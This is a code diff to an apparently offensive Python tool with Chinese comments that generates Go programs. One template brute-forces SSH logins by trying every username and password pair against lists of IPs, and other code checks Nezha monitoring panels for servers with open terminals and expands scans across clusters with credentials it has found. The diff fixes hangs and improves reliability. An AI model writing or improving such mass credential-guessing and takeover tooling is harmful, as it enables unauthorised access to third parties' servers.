@@ -303,11 +303,12 @@ XUI_GO_TEMPLATE_2_LINES = [
     "}",
 ]
 
-# SSH 登录模板
+# SSH 登录模板 (已修复挂起问题)
 XUI_GO_TEMPLATE_6_LINES = [
     "package main",
     "import (",
     "	\"bufio\"",
+    "	\"context\"",
     "	\"fmt\"",
     "	\"log\"",
     "	\"net/url\"",
@@ -317,12 +318,28 @@ XUI_GO_TEMPLATE_6_LINES = [
     "	\"time\"",
     "	\"golang.org/x/crypto/ssh\"",
     ")",
+    "// worker 函数为每个IP任务添加了硬性超时，防止程序挂起",
     "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
     "	defer wg.Done()",
     "	for line := range tasks {",
-    "		processIP(line, file, usernames, passwords)",
+    "		// 为每个IP处理设置一个硬性超时（用户设置的超时的3倍）",
+    "		ctx, cancel := context.WithTimeout(context.Background(), time.Duration({timeout}*3)*time.Second)",
+    "		done := make(chan bool)",
+    "		go func() {",
+    "			processIP(line, file, usernames, passwords)",
+    "			done <- true",
+    "		}()",
+    "		select {",
+    "		case <-done:",
+    "			// 正常完成",
+    "		case <-ctx.Done():",
+    "			// 超时。processIP的goroutine会被泄露，但主worker可以继续，",
+    "			// 从而防止整个程序挂起。",
+    "		}",
+    "		cancel() // 释放上下文资源",
     "	}",
     "}",
+    "// processIP 针对单个IP，尝试所有用户名和密码组合进行SSH登录",
     "func processIP(line string, file *os.File, usernames []string, passwords []string) {",
     "	var ipPort string",
     "	u, err := url.Parse(strings.TrimSpace(line))",
@@ -334,6 +351,7 @@ XUI_GO_TEMPLATE_6_LINES = [
     "	parts := strings.Split(ipPort, \":\")",
     "	if len(parts) != 2 { return }",
     "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
+    "   log.SetOutput(os.Stderr) // 确保日志输出到标准错误",
     "   log.Printf(\"Scanning SSH: %s:%s\", ip, port)",
     "	for _, username := range usernames {",
     "		for _, password := range passwords {",
@@ -1268,7 +1286,6 @@ def analyze_panel(result_line):
                                 server_data = server_res.json()
                                 servers = server_data if isinstance(server_data, list) else server_data.get("data", [])
                                 machine_count = len(servers)
-                                # 在获取到服务器列表后，再检查终端状态
                                 for server in servers:
                                     if isinstance(server, dict) and "id" in server:
                                         if check_server_terminal_status(session, base_url, server["id"]):
@@ -1295,7 +1312,6 @@ def check_server_terminal_status(session, base_url, server_id):
 
 
 # =========================== 主脚本逻辑 ===========================
-# 优先使用 /usr/local/go/bin/go, 其次使用系统路径中的 go
 GO_EXEC = "/usr/local/go/bin/go" if os.path.exists("/usr/local/go/bin/go") else "go"
 
 def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
@@ -1303,7 +1319,6 @@ def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
     try:
         wb = load_workbook(xlsx_file)
         ws = wb.active
-        # 添加新的表头
         ws.cell(row=1, column=ws.max_column + 1, value="服务器总数")
         ws.cell(row=1, column=ws.max_column + 1, value="终端畅通数")
         ws.cell(row=1, column=ws.max_column + 1, value="畅通服务器列表")
@@ -1348,11 +1363,11 @@ def compile_go_program(go_file, executable_name):
     if sys.platform == "win32": executable_name += ".exe"
     print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_name}...")
     
-    # 为编译创建一个安全的环境
     build_env = os.environ.copy()
     temp_home_created = False
-    if 'HOME' not in build_env:
-        temp_home = os.path.join(os.getcwd(), ".gohome_build")
+    temp_home = ""
+    if 'HOME' not in build_env or not build_env['HOME']:
+        temp_home = os.path.join(os.getcwd(), f".gohome_build_{os.getpid()}")
         os.makedirs(temp_home, exist_ok=True)
         build_env['HOME'] = temp_home
         print(f"   - ⚠️  未定义 HOME 变量，临时设置为: {temp_home}")
@@ -1378,15 +1393,14 @@ def compile_go_program(go_file, executable_name):
             print(f"   - 错误输出:\n{e.stderr.decode('utf-8', 'ignore')}")
         sys.exit(1)
     finally:
-        if temp_home_created and 'temp_home' in locals():
+        if temp_home_created:
              shutil.rmtree(temp_home, ignore_errors=True)
 
 def adjust_oom_score():
     if sys.platform != "linux": return
     try:
         pid = os.getpid()
-        with open(f"/proc/{pid}/oom_score_adj", "w") as f:
-            f.write("-500")
+        with open(f"/proc/{pid}/oom_score_adj", "w") as f: f.write("-500")
         print("✅ [系统] 成功调整OOM Score，降低被系统杀死的概率。")
     except PermissionError:
         print("⚠️  [系统] 调整OOM Score失败：权限不足。")
@@ -1425,7 +1439,6 @@ def cleanup_swap(swap_file):
     except Exception as e:
         print(f"⚠️  [系统] 清理Swap文件失败: {e}")
 
-
 def is_in_china():
     print("    - 正在通过 ping google.com 检测网络环境...")
     try:
@@ -1444,8 +1457,9 @@ def check_environment(template_mode, is_china_env):
     
     go_env = os.environ.copy()
     temp_home_created = False
-    if 'HOME' not in go_env:
-        temp_home = os.path.join(os.getcwd(), ".gohome_env_check")
+    temp_home = ""
+    if 'HOME' not in go_env or not go_env['HOME']:
+        temp_home = os.path.join(os.getcwd(), f".gohome_env_check_{os.getpid()}")
         os.makedirs(temp_home, exist_ok=True)
         go_env['HOME'] = temp_home
         print(f"   - ⚠️  未定义 HOME 变量，临时设置为: {temp_home}")
@@ -1477,11 +1491,10 @@ def check_environment(template_mode, is_china_env):
             print(f"   - 错误详情: {e.stderr.decode('utf-8', 'ignore')}")
         sys.exit(1)
     finally:
-        if temp_home_created and 'temp_home' in locals():
+        if temp_home_created:
             shutil.rmtree(temp_home, ignore_errors=True)
 
     print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")
-
 
 def process_chunk(chunk_id, lines, executable_name):
     input_file = os.path.join(TEMP_PART_DIR, f"input_{chunk_id}.txt")
@@ -1607,7 +1620,6 @@ def scan_single_cluster(cluster_info):
         verify_output = os.path.join(TEMP_EXPAND_DIR, f"verify_out_{cluster_id}.tmp")
         with open(verify_input, 'w') as f: f.write("\n".join(ips_to_verify))
 
-        # Compile a temporary, specific executable for this cluster
         temp_go = f"expand_{cluster_id}.go"
         temp_exec = f"expand_exec_{cluster_id}"
         temp_params = {**params, 'usernames': [user], 'passwords': [password]}
